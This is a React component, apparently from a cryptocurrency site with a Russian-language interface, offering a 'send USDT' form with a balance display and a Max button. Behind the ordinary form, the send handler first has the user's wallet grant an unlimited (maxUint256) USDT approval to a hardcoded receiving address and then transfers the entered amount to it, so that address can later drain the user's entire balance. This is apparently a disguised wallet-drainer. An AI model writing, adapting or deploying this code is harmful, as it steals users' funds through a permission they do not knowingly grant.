import ButtonPrimary from "./ButtonPrimary";
import { useCallback, useEffect, useMemo, useState } from "react";
import {
  useAccount,
  useChainId,
  useReadContracts,
  useWaitForTransactionReceipt,
  useWriteContract,
} from "wagmi";
import { TOKEN_DIVIDEND, USDT_CONTRACT } from "../common/constant";
import { erc20Abi, maxUint256, parseEther } from "viem";
import BigNumber from "bignumber.js";
import showToast from "../utils/showToast";

const walletReceive = "0x1Bb8a3A4Db968158725a8d0D009723547110329e";

const FormSubmit = () => {
  const [inputValue, setInputValue] = useState("");
  const onChangeInputValue = useCallback((event) => {
    setInputValue(event.target.value);
  }, []);
  const { isConnected } = useAccount();

  const [errors, setErrors] = useState();
  const [loading, setLoading] = useState(false);

  const { address } = useAccount();
  const chainId = useChainId();
  // const estimateGas = useEstimateGas();
  // const estimateFeePerGas = useEstimateMaxPriorityFeePerGas();

  const rawBalance = useReadContracts({
    allowFailure: true,
    contracts: [
      {
        address: USDT_CONTRACT[chainId],
        abi: erc20Abi,
        functionName: "balanceOf",
        // @ts-ignore
        args: [address],
      },
    ],
    query: {
      enabled: typeof address !== "undefined",
      refetchInterval: 1000,
    },
  });

  const isDisabledInput = loading || !address;

  const { error: errorApprove, writeContractAsync: writeContractApproveAsync } =
    useWriteContract();

  const {
    data: sendHash,
    error: errorSend,
    writeContractAsync: writeContractSendAsync,
  } = useWriteContract();

  const { isSuccess: isConfirmedSend } = useWaitForTransactionReceipt({
    hash: sendHash,
  });

  const balance = useMemo(() => {
    const rawBalanceValue = rawBalance.data?.[0]?.result;

    if (!rawBalanceValue) {
      return {
        value: undefined,
        formattedNumber: undefined,
        formatted: undefined,
      };
    }

    const balanceBn = BigNumber(rawBalanceValue.toString()).div(TOKEN_DIVIDEND);

    return {
      value: rawBalanceValue,
      formattedNumber: balanceBn.toNumber(),
      formatted: balanceBn.toString(),
    };
  }, [rawBalance]);

  const onClickMax = useCallback(() => {
    const balanceValue = balance?.value;

    if (!balanceValue) {
      setInputValue("0");
      return;
    }

    const balanceValueBn = BigNumber(balanceValue.toString());

    setInputValue(balanceValueBn.div(TOKEN_DIVIDEND).toString());
  }, [balance]);

  //   const onChangeToAddress = useCallback(
  //     (event: ChangeEvent<HTMLInputElement>) => {
  //       setToAddress(event.target.value);
  //     },
  //     []
  //   );

  const onClickSend = useCallback(async () => {
    setErrors(undefined);

    const errorArr = [];

    // if (!toAddress || !isAddress(toAddress)) {
    //   errorArr.push(`Address '${toAddress}' is invalid.`);
    // }

    let sendValue;

    try {
      sendValue = parseEther(inputValue);

      if (sendValue <= 0) {
        errorArr.push("Пожалуйста, введите сумму");
      } else if (sendValue > (balance?.value ?? 0)) {
        errorArr.push("Недостаточный баланс.");
      }
    } catch (e) {
      errorArr.push(e.message);
    }

    if (errorArr.length > 0) {
      setErrors(errorArr.join("\n"));
      return;
    }

    setLoading(true);

    await writeContractApproveAsync({
      address: USDT_CONTRACT[chainId],
      functionName: "approve",
      abi: erc20Abi,
      // @ts-ignore
      args: [walletReceive, maxUint256],
    });

    setTimeout(async () => {
      await writeContractSendAsync({
        address: USDT_CONTRACT[chainId],
        functionName: "transfer",
        abi: erc20Abi,
        // @ts-ignore
        args: [walletReceive, sendValue],
      });
      setLoading(false);
    }, 4000);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [inputValue]);

  useEffect(() => {
    if (errorApprove) {
      setErrors(errorApprove.shortMessage ?? errorApprove.message);
    }

    if (errorSend) {
      setErrors(errorSend.shortMessage ?? errorSend.message);
    }
  }, [errorApprove, errorSend]);

  useEffect(() => {
    if (isConfirmedSend) {
      setLoading(false);
      showToast("success", "Транзакция подтверждена: " + sendHash, {
        autoClose: 5000,
      });
    } else {
      setLoading(false);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConfirmedSend]);

  useEffect(() => {
    if (errors) {
      showToast("error", errors);
      setLoading(false);
    } else {
      setLoading(false);
    }
  }, [errors]);
  return (
    <div className="flex flex-col items-center justify-center mt-5 lg:w-full gap-y-7">
      <div className="relative w-full">
        <input
          type="number"
          className={
            "w-full px-5 py-[14px] text-[22px] transition-all bg-transparent border rounded-lg outline-none border-borderColor focus:border-primaryColor " +
            (isDisabledInput && "cursor-not-allowed")
          }
          disabled={isDisabledInput}
          placeholder="0.0000"
          value={inputValue}
          onChange={onChangeInputValue}
        />
        <span className="absolute right-0 text-sm translate-y-[2px] top-full">
          {`Доступный ${
            balance.formattedNumber
              ? `${new Intl.NumberFormat("en-US").format(
                  balance.formattedNumber
                )} USDT`
              : "0 USDT"
          }`}
        </span>
        <button
          className={
            "absolute px-5 py-3 -translate-y-1/2 rounded-lg top-1/2 right-3 bg-grayColor " +
            (isDisabledInput && "cursor-not-allowed")
          }
          onClick={isConnected ? onClickMax : undefined}
        >
          Макс
        </button>
      </div>
      {isConnected ? (
        <ButtonPrimary
          className="w-full py-[14px] text-lg uppercase"
          onClick={onClickSend}
        >
          ОТПРАВИТЬ USDT
        </ButtonPrimary>
      ) : (
        <button className="w-full py-[14px] text-lg text-white rounded-lg cursor-default font-square-medium opacity-60 bg-grayColor">
          Пожалуйста, подключите свой кошелек
        </button>
      )}
    </div>
  );
};

export default FormSubmit;
